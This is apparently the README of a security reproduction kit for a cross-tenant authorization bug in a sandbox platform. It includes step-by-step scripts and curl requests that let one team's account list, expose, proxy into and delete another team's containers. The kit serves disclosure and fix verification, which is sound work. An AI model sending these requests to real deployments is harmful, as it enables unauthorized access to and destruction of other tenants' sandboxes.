# Cross-tenant sandbox takeover — reproduction kit

Private repro for the report against SAP/astonish (commit
`41f5b7b7589c276c61e2cef1e9450cf054a062bc` and current `main`).

**Do not run this against production.** Point `BASE_URL` at a dedicated
dev/staging platform. Keep `.env` out of git.

Target used while writing this kit (Incus platform):

```
https://astonish.local.muxpie.com
```

## What the bug is

On a multi-tenant (PostgreSQL) deployment, several sandbox management
handlers look up sessions with `sandbox.NewSessionRegistry()` — the
single-tenant personal-mode store — instead of
`buildPGSessionRegistry(r.Context())`, which scopes the lookup to the
caller's org/team.

Affected handlers (all sit behind normal session auth; any valid account
is enough):

| Handler | Route | File |
|---|---|---|
| `SandboxContainerListHandler` | `GET /api/sandbox/containers` | `pkg/api/sandbox_handlers.go` |
| `SandboxContainerDeleteHandler` | `DELETE /api/sandbox/containers/{id}` | same |
| `SandboxListExposedPortsHandler` | `GET /api/sandbox/containers/{id}/expose` | same |
| `SandboxExposePortHandler` | `POST /api/sandbox/containers/{id}/expose` | same |
| `SandboxUnexposePortHandler` | `DELETE /api/sandbox/containers/{id}/expose/{port}` | same |
| `SandboxPinContainerHandler` | `POST /api/sandbox/containers/{id}/pin` | same |
| `SandboxProxyHandler` | `GET /api/sandbox/proxy/{container}/{port}/...` | `pkg/api/sandbox_proxy.go` |

The correct, tenant-aware path already exists in
`pkg/api/sandbox_backend.go` (`buildPGSessionRegistry`) and is used by
team-template handlers. These container-management handlers never call it.

Personal / SQLite mode is **not** in scope: there is only one tenant.

## What you need

- `curl`, `jq`, `python3`, `bash`
- A **platform-mode** (PostgreSQL) Astonish server with sandbox enabled
- Two ordinary accounts in **different teams** of the same org (or
  different orgs — either is a finding)
  - **Victim (Team B)** — will own a running sandbox
  - **Attacker (Team A)** — must **not** be a member of Team B; no admin
    role required
- The victim must have at least one sandbox container before step 03.
  Easiest: log into Studio as the victim, start a chat that uses a
  sandbox, wait until it is running.
- **Incus backend.** The reported handlers talk to Incus (`sandboxConnect()`).
  On Kubernetes they 503 before the tenant bug is reachable. Run
  `./00-check-backend.sh` after login. See “Kubernetes / OpenShell hosts”.

## One-time setup

```bash
cd tests/security/cross-tenant-sandbox
cp env.example .env
# edit .env — emails, passwords, optional team slugs
chmod +x *.sh
```

`.env` fields:

| Variable | Required | Meaning |
|---|---|---|
| `BASE_URL` | yes | Platform URL, no trailing slash |
| `VICTIM_EMAIL` / `VICTIM_PASSWORD` | yes | Team B account |
| `ATTACKER_EMAIL` / `ATTACKER_PASSWORD` | yes | Team A account |
| `VICTIM_TEAM` / `ATTACKER_TEAM` | if multi-team | Force `X-Astonish-Team` |
| `VICTIM_ORG` / `ATTACKER_ORG` | if multi-org | Passed to `/api/auth/login` |
| `EXPOSE_PORT` | no (default 8080) | Port the attacker tries to open |

Auth uses `client_type=cli` so the JWT comes back in the JSON body
(`access_token`) and subsequent calls send `Authorization: Bearer …`.
That matches `pkg/client.LoginWithPassword` and skips cookie/CSRF.

## Run the chain

Scripts are numbered and share state under `.state/`. Run them in order.
Each one prints `Next: ./0N-….sh`.

```bash
cd tests/security/cross-tenant-sandbox

./01-victim-login.sh
./00-check-backend.sh            # confirms Incus vs K8s vs OpenShell
# If backend is Incus: start a sandbox as the victim in Studio, then:
./02-attacker-login.sh
./03-victim-list-containers.sh   # records .state/victim-container-name
./04-attacker-list-containers.sh # FIRST PROOF
./05-attacker-list-exposed-ports.sh
./06-attacker-expose-port.sh
./07-attacker-proxy.sh

# optional, DESTRUCTIVE — destroys the victim sandbox:
CONFIRM_DESTROY=yes ./08-attacker-delete-container.sh

./09-cleanup.sh                  # unexpose (as victim) + wipe .state/
```

Or, non-destructive run in one shot (stops before delete):

```bash
./01-victim-login.sh && \
./02-attacker-login.sh && \
./03-victim-list-containers.sh && \
./04-attacker-list-containers.sh && \
./05-attacker-list-exposed-ports.sh && \
./06-attacker-expose-port.sh && \
./07-attacker-proxy.sh
```

Re-run the same sequence after a fix. Compare `.state/verdicts.log`.

## How to read a verdict

Every proof script appends a line to `.state/verdicts.log`:

```
<utc-iso>  VULNERABLE|FIXED|INCONCLUSIVE  <reason>
```

and prints `VERDICT: …` on stdout.

| Step | Vulnerable | Fixed |
|---|---|---|
| 04 list | victim container **is** in the attacker's `containers[]` | it is **absent** |
| 05 ports | HTTP **200** | HTTP **404** |
| 06 expose | HTTP **200** `status=ok` | HTTP **404** |
| 07 proxy | HTTP **200** (or **502/504** — the handler dialed the victim box) | HTTP **403** or **404** |
| 08 delete | HTTP **200** `status=ok` | HTTP **404** |

Step 04 alone is enough to confirm the issue. 05–07 show the blast
radius (read ports, open a port, proxy traffic in). 08 is the
destructive proof; skip it unless you can recreate the victim sandbox.

A **502** on step 07 is still a finding: `SandboxProxyHandler` already
passed `IsPortExposed` and tried to dial the container. Nothing listening
inside does not make the access check succeed.

## Kubernetes / OpenShell hosts

K8s/OpenShell platforms (for example a previous
`https://astonish.eu-de-2.cloud.sap` cluster) **cannot simulate the
reported takeover** through these scripts. The Incus host
`https://astonish.local.muxpie.com` can.

Every handler in the report starts with `sandboxConnect()`:

```go
func sandboxConnect() (*incus.IncusClient, error) {
    platform, reason := incus.DetectPlatformReason()
    if platform == incus.PlatformUnsupported {
        return nil, fmt.Errorf("sandbox unavailable: %s", reason)
    }
    // ...
}
```

`DetectPlatformReason()` looks for a local Incus socket. On Kubernetes
it returns “Incus is not installed” and the handler responds **HTTP 503
before `NewSessionRegistry()` runs**. There is no tenant lookup, so
there is nothing to leak or take over via `/api/sandbox/containers`.

K8s session pods are created through `sandboxBackendForRequest` →
`buildPGSessionRegistry(r.Context())`, which **is** team-scoped. Chat
session list/delete (`/api/studio/sessions`) also goes through the
tenant-scoped store. Those are a different surface from this report.

What you *can* capture on K8s as evidence:

```bash
./01-victim-login.sh
./00-check-backend.sh            # backend=k8s, platform=kubernetes
./03-victim-list-containers.sh   # HTTP 503, Incus is not installed
```

That 503 is the correct outcome on K8s. To exercise 04–08 use the
Incus host (`https://astonish.local.muxpie.com`) with two teams.

## State files

All local artifacts live in `.state/` (gitignored):

| File | Written by | Contents |
|---|---|---|
| `victim.json` / `attacker.json` | 01 / 02 | CLI tokens + user/org/team |
| `victim-containers.json` | 03 | victim's list response |
| `victim-container-name` | 03 | chosen container id |
| `attacker-containers.json` | 04 | attacker's list response |
| `attacker-list-ports.json` | 05 | |
| `attacker-expose.json` | 06 | |
| `exposed-port` | 06 | port number used |
| `attacker-proxy.body` | 07 | raw proxy body |
| `attacker-delete.json` | 08 | |
| `verdicts.log` | 04–08 | timestamped verdicts |

`./09-cleanup.sh` deletes `.state/` after attempting to unexpose the
port **as the victim**. It does not delete the container.

## Manual equivalent (if you prefer curl)

Login (CLI tokens in the body):

```bash
curl -sS -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"...","password":"...","client_type":"cli"}'
```

Then:

```bash
# 03 / 04
curl -sS -H "Authorization: Bearer $TOKEN" \
  -H "X-Astonish-Team: $TEAM" \
  "$BASE_URL/api/sandbox/containers"

# 05
curl -sS -H "Authorization: Bearer $TOKEN" \
  "$BASE_URL/api/sandbox/containers/$ID/expose"

# 06
curl -sS -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"port":8080}' \
  "$BASE_URL/api/sandbox/containers/$ID/expose"

# 07
curl -sS -H "Authorization: Bearer $TOKEN" \
  "$BASE_URL/api/sandbox/proxy/$ID/8080/"

# 08
curl -sS -X DELETE -H "Authorization: Bearer $TOKEN" \
  "$BASE_URL/api/sandbox/containers/$ID"
```

## Expected code-level fix (not applied here)

Route the listed handlers through `buildPGSessionRegistry(r.Context())`
(or an equivalent tenant check) and only fall back to
`sandbox.NewSessionRegistry()` in genuine single-tenant deployments —
the same pattern `sandboxBackendForRequest` already uses.

## Safety

- Scripts talk only to `BASE_URL` from `.env`.
- Step 08 requires `CONFIRM_DESTROY=yes`.
- `.env` and `.state/` are gitignored.
- Tokens are JWTs for two test accounts; treat `.state/*.json` as secrets.
